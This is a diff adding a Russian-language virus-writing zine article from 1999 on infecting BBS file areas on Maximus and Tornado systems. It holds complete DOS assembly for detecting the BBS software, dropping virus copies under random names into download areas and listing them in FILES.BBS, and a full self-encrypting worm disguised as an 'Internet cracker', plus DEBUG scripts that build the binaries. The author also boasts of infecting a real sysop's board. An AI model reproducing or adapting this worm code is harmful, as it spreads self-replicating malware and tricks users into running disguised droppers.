@@ -1,0 +1,695 @@
+─[BBS INFECTION]────────────────────────────────────────────────────[MONGOOSE]─
+
+
+    В 10ом выпуске MoonBug'а я опубликовал свою статью о методах использования
+ bbs для нужд вируса (не файловой базы/архивов). Правда эта статья не содержа-
+ ла примеров, там  была истолкованна только теория (на примере максимуса). Наш
+ вирус (червь) использующий эту технологию уже был выпущен на пару новых  борд
+ и вышел в качестве релиза команды. Ниже  рассказывается о заражении некоторых
+ bbs платформ.
+
+    Я просто офигел когда увидел, что вирус Worm Ternopil (использующий техно-
+ логию заражения files.bbs максимуса) попал в список четырех наиболее интерес-
+ ных вирусов июня `99 (так утверждает Касперский в своем электроном вестнике).
+
+
+                                 "содержание"
+
+    1. Два метода заражения maximus (тестировалось на версии 3.01)
+    2. Заражение tornado (тестировалось на версии 1.56g)
+
+                                     * * *
+
+   1A. Заражение maximus (первый метод)
+
+    Так как первый метод заражения максимуса я описал в MoonBug'е #10 здесь он
+ представлен в кратце и полностью снабжен кодом.
+
+    Первым делом  нам  надо определить есть ли у жертвы максимус, чтобы лишний
+ раз не искать файлы. Для этого мы залезаем в C:\AUTOEXEC.BAT, считываем 2кб и
+ ищем в них: "set maximus" или "SET MAXIMUS" если какая нибудь из строк найде-
+ на то мы _включаем_ или _выключаем_ флаг.
+
+────[FIND_MAX.ASM]───[START]───────────────────────────────────────────────────
+ check_maximus: mov    ax,3d02h                 ; Open for read'n'write
+                mov    dx,offset auto           ; C:\AUTOEXEC.BAT
+                int    21h
+                jc     not_found                ; Jump if file not found/error
+                xchg   bx,ax                    ; Move file handle to bx
+
+                mov    ah,3fh                   ; Real 2kb from autoexec.bat
+                mov    cx,2000                  ; in buffer
+                mov    dx,offset buffer_auto    ; File location
+                int    21h
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+
+                sub    bx,bx                    ; Zero register
+                mov    cx,2000                  ; Number bytes to check
+ max_check:     push   cx                       ; Save block size
+;╒═════════════════════════════════════════════════════════════════════════════
+;│ Compare with "set maximus"
+;╘═════════════════════════════════════════════════════════════════════════════
+                mov    di,offset [set_maximus_1]
+                lea    si,offset [bx+buffer_auto]
+                mov    cx,11                    ; Compare 11 bytes
+                cld
+                repe   cmpsb
+                jz     found                    ; Jump if ==
+;╒═════════════════════════════════════════════════════════════════════════════
+;│ Compare with "SET MAXIMUS"
+;╘═════════════════════════════════════════════════════════════════════════════
+                mov    di,offset [set_maximus_2]
+                lea    si,offset [bx+buffer_auto]
+                mov    cx,11                    ; Compare 11 bytes
+                cld
+                repe   cmpsb
+                jnz    chk_again                ; Jump if !=
+                 
+ found:         pop    cx                       ; Restore CX
+                mov    byte ptr maximus_set,1   ; Set flag (maximus found)
+                ret                             ; Return to caller
+
+ chk_again:     inc    bx                       ; Increase
+                pop    cx                       ; Restore CX
+                loop   max_check                ; Continue until CX == 0
+ not_found:     mov    byte ptr maximus_set,0   ; Set flag (maximus not found)
+                ret
+
+ auto                  db 'c:\autoexec.bat',0   ; Path to AUTOEXEC.BAT
+ maximus_set           db ?                     ; 0 - No Maximus
+                                                ; 1 - Maximus found
+ buffer_auto           db 2000 dup (?)          ; Buffer for 2kb from AUTOEXEC
+ set_maximus_1         db 'set maximus'         ; First string to compare
+ set_maximus_2         db 'SET MAXIMUS'         ; Second string to compare
+────[FIND_MAX.ASM]───[END]─────────────────────────────────────────────────────
+
+    После этого нам уже стало ясно есть ли на винте максимус или его  нет. Да-
+ лее при поиске файлов мы это еще вспомним.
+
+    Допустим наш вирус вовсе не червь, и он заражает  COM-файлы. Параллельно с
+ поиском файлов  в каталоге вирус должен проверять включен ли флаг (установлен
+ ли максимус) и если да, то  перед поиском (или после) COM-файлов вирус должен
+ поискать в каталоге файлик FILES.BBS. Если он найден, то значит этот  каталог
+ возможно является файловой областью станции. Является или нет  нам все равно,
+ мы должны проверить  не заражена ли уже облась. Обычно сисопы (даже самые...)
+ держат на станции только запакованные файл, поэтому кроме нашего  дроппера (в
+ виде COM или EXE файла), если конечно область заражена других COM-файлов  там
+ быть не  должно. Затем _мы_ должны создать дроппер содержащий вирусный  код и
+ вписать его (дроппера) имя в FILES.BBS.
+
+────[CHECK_IF.ASM]───[START]───────────────────────────────────────────────────
+ infect_maximus:call   search_exe               ; Check, if area already in-
+                cmp    al,32                    ; fected
+                jnz    no_file_bbs              ; Jump if infected
+
+                mov    ax,3d02h                 ; Open for read'n'write
+                mov    dx,offset max_file_list
+                int    21h
+                jc     no_file_bbs              ; Jump if error occured
+                xchg   bx,ax                    ; Move file handle to BX
+
+                mov    ax,4202h                 ; Move pointer to end of file
+                sub    cx,cx
+                cwd
+                int    21h
+
+                mov    ah,40h                   ; Add dropper to file area
+                mov    cx,(string_end-string_fb)
+                mov    dx,offset string_fb
+                int    21h
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+ no_file_bbs:   ret
+ string_fb             db 13,10                 ; File name
+                       db '-=ЁMYЁ=-.EXE',0
+ string_end     label  byte
+ max_file_list         db 'files.bbs',0
+;╒════════════════════════════════════════════════════════════════════════════
+;│ Search COM-files in current directory
+;╘════════════════════════════════════════════════════════════════════════════
+ search_exe:    mov    ah,4eh                   ; Search for our droppers in
+                sub    cx,cx                    ; area
+                mov    dx,offset mask_exe
+                int    21h
+                jnc    fb_infected              ; Jump if dropper found
+
+                call   rnd_name                 ; Generate random name
+
+                mov    di,offset [string_fb+2]
+                mov    si,offset r_fname
+                mov    cx,8
+                cld
+                rep    movsb
+
+                mov    ah,3ch                   ; Create dropper
+                sub    cx,cx
+                mov    dx,offset string_fb+2
+                int    21h
+                jc     fb_infected              ; Jump if error
+                xchg   bx,ax                    ; Move file handle in BX
+
+                in     ax,40h                   ; Get random number in AX
+                xchg   cx,ax                    ; Move it to CX
+                call   rnd_num                  ; Get random number (of junk)
+                                                ; from 0 to CX
+
+                mov    cx,(end_of_code-start)   ; Virus body size
+                add    cx,ax                    ; Add some junk
+                mov    dx,offset real_start     ; Virus body location
+                mov    ah,40h                   ; Write it to file
+                int    21h
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+
+                mov    al,32                    ; Return 32
+ fb_infected:   ret
+ mask_exe              db '*.exe',0
+;╒════════════════════════════════════════════════════════════════════════════
+;│ Generate random name │ ON EXIT RANDOM NAME IN "r_fname"
+;╘════════════════════════════════════════════════════════════════════════════
+ rnd_name:      push   bp
+                sub    bp,bp
+
+ _check:        cmp    bp,8
+                jz     exit
+
+                mov    cx,4
+                call   rnd_num
+                test   ax,ax
+                jz     ch_number
+
+ ch_letter:     mov    cx,26
+                call   rnd_num
+                add    al,41h
+                jmp    move_ch
+
+ ch_number:     mov    cx,10
+                call   rnd_num
+                add    al,30h
+                
+ move_ch:       mov    byte ptr [bp+r_fname],al
+                inc    bp
+                jmp    _check
+
+ exit:          mov    di,offset [r_fname+8]
+                mov    si,offset [f_name+8]
+                mov    cx,5
+                cld
+                rep    movsb
+                pop    bp
+                ret
+ f_name                db 'ABCDEFGH.COM'
+ r_fname               db 'ABCDEFGH.COM',0      ; Filename
+────[CHECK_IF.ASM]───[END]─────────────────────────────────────────────────────
+
+   1B. Второй метод заражения maximus
+
+    Правда Ternopil  Worm  заражал  только текущий диск а файловая база обычно
+ находится у системных операторов не на одном диске с bbs софтом, а обход всех
+ дисков - дерьмо. Поэтому можно искать файлик "filearea.ctl" (в нем содержится
+ информация о всех файловых ариях станции),  но не только максимус  использует
+ этот  файл,  торнада  тоже использует файл с таким же названием поэтому нужно
+ проверить действительно ли перед нами максимус:  ищем файлы свойственные мак-
+ симусу,  например max.ctl.  Если мы нашли максимус включайте (если конечно он
+ небыл включен) флаг а/ля "maximus_set".
+
+    Чтобы заразить файл арию нужно использовать путь после "Download". Нестоит
+ трогать путь  после  "Upload" иначе мы заразим арию со свежими поступлениями,
+ некоторые сисопы проверяют новые поступления и наткнувшись на  дроппер  могут
+ заподозрить  неладное. После заражения файл арий _через "filearea.ctl"_ жела-
+ тельно отключить поиск "files.bbs" это поможет увеличить скорость работы  ви-
+ руса.
+
+    Ниже представлена программа считавающая из "filearea.ctl" (файл должен на-
+ ходиться в каталоге с программой) пути к файл ариям и записывающая их в  файл
+ "path.txt".
+
+────[GET_FA.ASM]─────[START]───────────────────────────────────────────────────
+               .model  tiny
+               .code
+                org    100h
+
+ sig_size              equ 8                    ; Signature size
+
+ start:         mov    ax,3d00h                 ; Open "filearea.ctl" for
+                mov    dx,offset file_area_ctl  ; read
+                int    21h
+                jc     exit_to_dos              ; Exit to dos if file not exist
+                xchg   bx,ax                    ; Move file handle to BX
+
+                mov    ah,3fh                   ; Read 40kb from "filearea.ctl"
+                mov    cx,40000
+                mov    dx,offset buffer
+                int    21h
+                mov    word ptr read,ax
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+
+                mov    ah,3ch                   ; Create "path.txt"
+                sub    cx,cx
+                mov    dx,offset f_name
+                int    21h
+                xchg   bx,ax                    ; Move file handle to BX
+
+                sub    si,si                    ; Zero register
+ get_again:     call   get_path                 ; Get path
+                or     cx,cx
+                jz     close_file               ; Jump if error occured
+
+                mov    ah,40h                   ; Write path to file
+                mov    dx,offset path_or_fname
+                int    21h
+
+                mov    ah,40h
+                mov    cx,2
+                mov    dx,offset _nul
+                int    21h
+                jmp    get_again                ; Find path for next filearea
+
+ close_file:    mov    ah,3eh                   ; Close file
+                int    21h
+
+ exit_to_dos:   int    20h                      ;Exit to DOS
+;══════════════════════════════════════════════════════════════════════════════
+ get_path:      mov    ah,byte ptr comment_byte ; Comment byte in AH
+ find_loop:     cmp    byte ptr [si+buffer],ah  ; Is string commented?
+                jnz    check_it                 ; Jump if not
+ check_when:    cmp    word ptr [si+buffer],0a0dh
+                jz     check_it                 ; Search for end of string
+                inc    si                       ; Net byte
+                cmp    si,word ptr read
+                ja     error                    ; Jump if _eof_
+                jmp    check_when
+
+ check_it:      push   si                       ; Save SI in stack
+                add    si,offset buffer
+                mov    di,offset signature
+                mov    cx,word ptr sig_size     ; Signature size
+                cld
+                rep    cmpsb                    ; Compare signatures
+                pop    si                       ; Restore SI
+                jz     we_find_it               ; Continue if equal
+
+ cont_find:     inc    si                       ; Next byte
+                cmp    si,word ptr read
+                jnz    find_loop                ; Continue until we don't
+                                                ; find path or reach _eof_
+ error:         sub    cx,cx
+                ret
+
+ we_find_it:    add    si,word ptr sig_size     ; Jump over signature
+ fnd_path_loop: cmp    byte ptr [si+buffer],20h ; Find beginning of path
+                jnz    path_found               ; Jump if path found
+                inc    si                       ; Next byte
+                cmp    si,word ptr read
+                jnz    fnd_path_loop
+                jmp    error                    ; Jump if path not found
+
+ path_found:    push   si                       ; Save SI
+                add    si,offset buffer         ; Move path to "path_or_fname"
+                mov    di,offset path_or_fname
+                mov    cx,64
+                cld
+                rep    movsb
+
+                sub    si,si                    ; Clear SI
+ find_end_loop: cmp    byte ptr [si+path_or_fname],20h
+                jz     create_file
+                cmp    byte ptr [si+path_or_fname],0ah
+                jz     create_file
+                cmp    byte ptr [si+path_or_fname],0dh
+                jz     create_file
+                mov    ah,byte ptr comment_byte
+                cmp    byte ptr [si+path_or_fname],ah
+                jz     create_file
+                inc    si
+                cmp    si,64
+                jnz    find_end_loop
+
+ create_file:   mov    byte ptr [si+path_or_fname],00h
+                mov    cx,si                    ; Move path size to CX
+                pop    si                       ; Restore SI
+                ret
+
+ comment_byte          db '%'                   ; Comment byte
+ file_area_ctl         db 'filearea.ctl',0      ; File name to open
+ signature             db 'Download'            ; Signature
+ _nul                  db 13,10
+ f_name                db 'path.txt',0          ; File name to create
+ read                  dw ?
+ path_or_fname         db 64 dup (?)            ; Path
+ buffer                db 40000 dup (?)         ; Buffer
+                end    start
+────[GET_FA.ASM]─────[END]─────────────────────────────────────────────────────
+
+────[GET_FA.SCR]─────[START]───────────────────────────────────────────────────
+N GET_FA.SCR
+E 0100 B8 00 3D BA D0 01 CD 21 72 3C 93 B4 3F B9 40 9C 
+E 0110 BA 32 02 CD 21 A3 F0 01 B4 3E CD 21 B4 3C 2B C9 
+E 0120 BA E7 01 CD 21 93 2B F6 E8 1D 00 0B C9 74 13 B4 
+E 0130 40 BA F2 01 CD 21 B4 40 B9 02 00 BA E5 01 CD 21 
+E 0140 EB E6 B4 3E CD 21 CD 20 8A 26 CF 01 38 A4 32 02 
+E 0150 75 11 81 BC 32 02 0D 0A 74 09 46 3B 36 F0 01 77 
+E 0160 1A EB EF 56 81 C6 32 02 BF DD 01 B9 08 00 FC F3 
+E 0170 A6 5E 74 0A 46 3B 36 F0 01 75 D1 2B C9 C3 83 C6 
+E 0180 08 80 BC 32 02 20 75 09 46 3B 36 F0 01 75 F2 EB 
+E 0190 EA 56 81 C6 32 02 BF F2 01 B9 40 00 FC F3 A4 2B 
+E 01A0 F6 80 BC F2 01 20 74 1E 80 BC F2 01 0A 74 17 80 
+E 01B0 BC F2 01 0D 74 10 8A 26 CF 01 38 A4 F2 01 74 06 
+E 01C0 46 83 FE 40 75 DB C6 84 F2 01 00 8B CE 5E C3 25 
+E 01D0 66 69 6C 65 61 72 65 61 2E 63 74 6C 00 44 6F 77 
+E 01E0 6E 6C 6F 61 64 0D 0A 70 61 74 68 2E 74 78 74 00 
+RCX
+00F0
+W
+Q
+────[GET_FA.SCR]─────[END]─────────────────────────────────────────────────────
+
+
+   2. Заражение tornado
+
+    Как то недавно я попал на станцию, при входе ее системный оператор повесил
+ с десяток  билютеней  сообщающих о том что взлом bbs незаконен,  вывесил даже
+ статью из уголовного кодекса. Когда  я почитал почту на его станции я узнал о
+ том что он заразился моим червяком. Червь не просто заразил архивы, а заразил
+ файловые арии (как я понял по рассказу сисопа), но  он использовал торнаду, а
+ червь умел заражать только максимус,  но факт остается фактом (желающие могут
+ позвонить: 503-0696, 00:00-07:00).
+
+    Заражение  торнады очень похоже  на второй способ  заражения максимуса, но
+ существвует несколько  различий. Определить наличие торнады  на винте не втак
+ просто как определить наличие максимуса (через autoexec.bat).
+
+   1. Можно  искать торнаду по всем дискам в каталоге "tornado" (каталог в ко-
+      торый торнада инсталируется по умолчанию).
+   2. Можно искать файлы _присущие_ только торнаде по всему винту.
+
+    Мне больше  нравится  второй метод,  ищем и заражаем архивы и за одно ищем
+ файлик "filearea.ctl" (такой же файл используется максимусом в  таких же  це-
+ лях). Если файлик найден то проверяем  есть ли в каталоге  файлик с названием
+ "filearea.bbs" если да то возможно мы нашли максимус.
+
+    У торнады в файлике "filearea.ctl" содержится  полная  информация  о  файл
+ ариях (как у максимуса). Ищем путь указаный в "DLPath" и заходим в него, соз-
+ даем дроппер если такого там нет (нужно обязательно запомнить имя дроппера) и
+ архивы в ней, затем  ищем путь для текущей арии указаный в "FileList" (просто
+ "files.bbs" не всегда может находиться в каталоге файл арии) и открываем фай-
+ лик и туда (желательно в конец файла) добавляем имя файла-дроппера, счетчик и
+ "описание" а/ля: "README.EXE [000] НОВЫЙ КРЯКЕР ИНТЕРНЕТА". Переходим к  сле-
+ дующей файл арии и так до тех пор пока арии незакончатся.
+
+   Ниже представлен пример торнадо-червячка:
+
+    Самошифрующийся DOS вирус-червь. Представляет из себя DOS com-файл размера
+ 518 байт. При запуске червь  ищет файл "filearea.ctl" в текущем каталоге  и в
+ каталоге "c:\tornado\". Если  файл найден то червь заражает все файл арии ко-
+ торые в  нем прописаны. Червь создает  файл со  своей копией и "регистрирует"
+ его в файле FILES.BBS - записывая в него имя файла-червя, счетчик  скачиваний
+ и свое "описание" (Internet cracker (NEW)).
+
+────[TESTWORM.ASM]───[START]───────────────────────────────────────────────────
+; Test_Worm.518 - First Tornado Worm
+;
+;                                 (c) mongoose, Misdirected Youth, August `99
+               .model  tiny
+               .code
+                org    100h
+
+ start:         mov    si,offset real_start     ; Decrypt virus code
+ key:           mov    al,0
+                mov    cx,(end_of_code-real_start)
+ decrypt_loop:  xor    byte ptr [si],al
+                inc    si
+                loop   decrypt_loop
+
+ real_start:    mov    ax,3d00h                 ; Open "filearea.ctl" in
+                mov    dx,offset file_area_ctl  ; current directory for read
+                int    21h
+                jnc    move_fhandle
+                
+                mov    ax,3d00h                 ; Open "c:\tornado\filearea..."
+                mov    dx,offset tornado        ; for read
+                int    21h
+                jnc    move_fhandle
+                jmp    exit_to_dos              ; Exit to dos if file not exist
+ move_fhandle:  xchg   bx,ax                    ; Move file handle to BX
+
+                mov    ah,3fh                   ; Read 40kb from "filearea.ctl"
+                mov    cx,40000
+                mov    dx,offset buffer
+                int    21h
+                mov    word ptr read,ax
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+
+                sub    si,si                    ; Zero register
+ get_again:     mov    word ptr sig_size,6      ; Set signature size
+                push   si
+                mov    di,offset signature      ;┐
+                mov    si,offset dlpath         ;│
+                mov    cx,6                     ;│Set new signature
+                cld                             ;│
+                rep    movsb                    ;┘
+                pop    si
+
+                call   get_path                 ; Get path to file area
+                or     cx,cx
+                jnz    add_dropper_n
+                jmp    exit_to_dos              ; Jump if error occured
+
+ add_dropper_n: push   si
+                mov    di,offset path_or_fname  ; Add dropper name to
+                add    di,cx                    ; filearea path
+                mov    si,offset [file_name-1]
+                mov    cx,14
+                cld
+                rep    movsb
+                pop    si
+
+                mov    ax,3d00h                 ; Area already infected?
+                mov    dx,offset path_or_fname
+                int    21h
+                cmp    ax,02h
+                jz     create_dropper           ; Create dropper if okey
+                xchg   bx,ax
+            
+                mov    ah,3eh                   ; Close file
+                int    21h
+                jmp    get_again                ; Next file area
+
+ create_dropper:mov    ah,3ch                   ; Create dropper in file area
+                sub    cx,cx
+                mov    dx,offset path_or_fname
+                int    21h
+                jc     get_again                ; Jump if error occured
+                xchg   bx,ax                    ; Move file handle to BX
+
+                push   si                       ; Move worm body in buffer
+                mov    si,offset real_start
+                mov    di,offset xor_buffer
+                mov    cx,(end_of_code-real_start)
+                push   cx
+                add    cx,(read-end_of_code)
+                cld
+                rep    movsb
+
+                in     al,40h                   ; Generate random number
+                mov    byte ptr [key+1],al
+
+                pop    cx si                    ; Crypt worm body
+                mov    di,offset xor_buffer
+ xor_loop:      xor    byte ptr [di],al
+                inc    di
+                loop   xor_loop
+
+                mov    cx,(real_start-start)    ; Write decryptor
+                mov    dx,offset start
+                call   write
+
+                mov    cx,(read-real_start)     ; Write crypted body
+                mov    dx,offset xor_buffer
+                call   write
+
+                mov    ah,3eh                   ; Close file
+                int    21h
+
+                mov    word ptr sig_size,8      ; Set signature size
+                push   si
+                mov    di,offset signature      ;┐
+                mov    si,offset filelist       ;│
+                mov    cx,8                     ;│Set new signature
+                cld                             ;│
+                rep    movsb                    ;┘
+                pop    si
+
+                call   get_path                 ; Get path to "files.bbs"
+                or     cx,cx
+                jnz    modify_fb
+                jmp    exit_to_dos              ; Jump if error occured
+
+ modify_fb:     mov    ax,3d02h                 ; Open "files.bbs"
+                mov    dx,offset path_or_fname
+                int    21h
+                jnc    move_file_h
+                jmp    get_again                ; Jump if file not found
+ move_file_h:   xchg   bx,ax
+
+                mov    ax,4202h                 ; Move pointer to end of file
+                sub    cx,cx
+                cwd
+                int    21h 
+
+                mov    cx,2
+                mov    dx,offset nul
+                call   write
+
+                mov    cx,12                    ; Write dropper name
+                mov    dx,offset file_name
+                call   write
+
+                mov    cx,(nul-description)     ; Write "description"
+                mov    dx,offset description
+                call   write
+
+ close_file:    mov    ah,3eh                   ; Close file
+                int    21h
+                jmp    get_again
+
+ exit_to_dos:   int    20h                      ;Exit to DOS
+;┌─────────────────────────────────────────────────────────────────────────────
+;│ DATA
+;└─────────────────────────────────────────────────────────────────────────────
+ comment_byte          db ';'                   ; Comment byte
+ tornado               db 'c:\tornado\'         ; Directory to search tornado
+ file_area_ctl         db 'filearea.ctl',0      ; File name to open
+                       db '\'
+ file_name             db 'TESTWORM.COM',0      ; File-worm name
+ dlpath                db 'DLPath'              ; To find file area path
+ filelist              db 'FileList'            ; To find "files.bbs"
+ description           db ' [000] Internet cracker (NEW)'
+ nul                   db 13,10
+;══════════════════════════════════════════════════════════════════════════════
+ write:         mov    ah,40h
+                int    21h
+                ret
+;══════════════════════════════════════════════════════════════════════════════
+ get_path:      mov    ah,byte ptr comment_byte ; Comment byte in AH
+ find_loop:     cmp    byte ptr [si+buffer],ah  ; Is string commented?
+                jnz    check_it                 ; Jump if not
+ check_when:    cmp    word ptr [si+buffer],0a0dh
+                jz     check_it                 ; Search for end of string
+                inc    si                       ; Net byte
+                cmp    si,word ptr read
+                ja     error                    ; Jump if _eof_
+                jmp    check_when
+
+ check_it:      push   si                       ; Save SI in stack
+                add    si,offset buffer
+                mov    di,offset signature
+                mov    cx,word ptr sig_size     ; Signature size
+                cld
+                rep    cmpsb                    ; Compare signatures
+                pop    si                       ; Restore SI
+                jz     we_find_it               ; Continue if equal
+
+ cont_find:     inc    si                       ; Next byte
+                cmp    si,word ptr read
+                jnz    find_loop                ; Continue until we don't
+                                                ; find path or reach _eof_
+ error:         sub    cx,cx
+                ret
+
+ we_find_it:    add    si,word ptr sig_size     ; Jump over signature
+ fnd_path_loop: cmp    byte ptr [si+buffer],20h ; Find beginning of path
+                jnz    path_found               ; Jump if path found
+                inc    si                       ; Next byte
+                cmp    si,word ptr read
+                jnz    fnd_path_loop
+                jmp    error                    ; Jump if path not found
+
+ path_found:    push   si                       ; Save SI
+                add    si,offset buffer         ; Move path to "path_or_fname"
+                mov    di,offset path_or_fname
+                mov    cx,64
+                cld
+                rep    movsb
+
+                sub    si,si                    ; Clear SI
+ find_end_loop: cmp    byte ptr [si+path_or_fname],20h
+                jz     create_file
+                cmp    byte ptr [si+path_or_fname],0ah
+                jz     create_file
+                cmp    byte ptr [si+path_or_fname],0dh
+                jz     create_file
+                mov    ah,byte ptr comment_byte
+                cmp    byte ptr [si+path_or_fname],ah
+                jz     create_file
+                inc    si
+                cmp    si,64
+                jnz    find_end_loop
+
+ create_file:   mov    byte ptr [si+path_or_fname],00h
+                mov    cx,si                    ; Move path size to CX
+                pop    si                       ; Restore SI
+                ret
+ end_of_code    label  byte
+ string                db 'Misdirected Youth'
+;═════════════════════════════════════════════════════════════════════════════
+ read                  dw ?
+ sig_size              dw ?                     ; Signature size
+ signature             db 8 dup (?)             ; Signature
+ path_or_fname         db 77 dup (?)            ; Path
+ xor_buffer            db (read-real_start) dup (?)
+ buffer                db 40000 dup (?)         ; Buffer
+
+                end    start
+────[TESTWORM.ASM]───[END]─────────────────────────────────────────────────────
+
+────[TESTWORM.SCR]───[START]───────────────────────────────────────────────────
+N TESTWORM.COM
+E 0100 BE 0D 01 B0 E8 B9 E8 01 30 04 46 E2 FB 50 E8 D5 
+E 0110 52 F7 EA 25 C9 9B E5 50 E8 D5 52 FC EA 25 C9 9B 
+E 0120 EB 01 05 E8 7B 5C D7 51 A8 74 52 B0 ED 25 C9 4B 
+E 0130 EE EB 5C D6 25 C9 C3 1E 2F EE E0 EB EE E8 BE 57 
+E 0140 E2 EB 56 D2 EA 51 EE E8 14 1B 4C B6 00 F5 E9 E3 
+E 0150 21 9D EB 01 53 E8 BE 57 FA EB EB 11 56 C4 EA 51 
+E 0160 E6 E8 14 1B 4C B6 50 E8 D5 52 FA EB 25 C9 D5 EA 
+E 0170 E8 9C EF 7B 5C D6 25 C9 03 56 5C D4 C3 21 52 FA 
+E 0180 EB 25 C9 9A 5B 7B BE 56 E5 E9 57 B7 EB 51 00 E9 
+E 0190 B9 6B 29 F9 14 1B 4C 0C A8 4A EC E9 B1 B6 57 B7 
+E 01A0 EB D8 ED AF 0A 13 51 E5 E8 52 E8 E9 00 50 E8 51 
+E 01B0 11 E9 52 B7 EB 00 47 E8 5C D6 25 C9 2F EE E0 EB 
+E 01C0 E0 E8 BE 57 E2 EB 56 A8 EA 51 E0 E8 14 1B 4C B6 
+E 01D0 00 71 E8 E3 21 9D EA 03 D0 50 EA D5 52 FA EB 25 
+E 01E0 C9 9B EB 01 BA 17 7B 50 EA AA C3 21 71 25 C9 51 
+E 01F0 EA E8 52 8D EA 00 87 E8 51 E4 E8 52 C5 EA 00 8E 
+E 0200 E8 51 F5 E8 52 A0 EA 00 B5 E8 5C D6 25 C9 01 CF 
+E 0210 17 25 C8 D3 8B D2 B4 9C 87 9A 86 89 8C 87 B4 8E 
+E 0220 81 84 8D 89 9A 8D 89 C6 8B 9C 84 E8 B4 BC AD BB 
+E 0230 BC BF A7 BA A5 C6 AB A7 A5 E8 AC A4 B8 89 9C 80 
+E 0240 AE 81 84 8D A4 81 9B 9C C8 B3 D8 D8 D8 B5 C8 A1 
+E 0250 86 9C 8D 9A 86 8D 9C C8 8B 9A 89 8B 83 8D 9A C8 
+E 0260 C0 A6 AD BF C1 E5 E2 5C A8 25 C9 2B 62 CE FB EA 
+E 0270 D0 4C B0 ED 9D F9 69 54 B0 ED E5 E2 9C E1 AE D3 
+E 0280 DE EE EB 9F F3 03 07 BE 69 2E B0 ED 57 E2 EB 63 
+E 0290 E6 E0 EB 14 1B 4E B6 9C E2 AE D3 DE EE EB 9D 38 
+E 02A0 C3 21 2B EB DE E0 EB 68 54 B0 ED C8 9D E1 AE D3 
+E 02B0 DE EE EB 9D 1A 03 01 BE 69 2E B0 ED 57 FA EB 51 
+E 02C0 A8 E8 14 1B 4C C3 1E 68 54 FA EB C8 9C F6 68 54 
+E 02D0 FA EB E2 9C FF 68 54 FA EB E5 9C F8 62 CE FB EA 
+E 02E0 D0 4C FA EB 9C EE AE 6B 16 A8 9D 33 2E 6C FA EB 
+E 02F0 E8 63 26 B6 2B 4D 69 73 64 69 72 65 63 74 65 64 
+E 0300 20 59 6F 75 74 68 
+RCX
+0206
+W
+Q
+────[TESTWORM.SCR]───[END]─────────────────────────────────────────────────────
+
+                                     (c) mongoose, soldier of Misdirected Youth
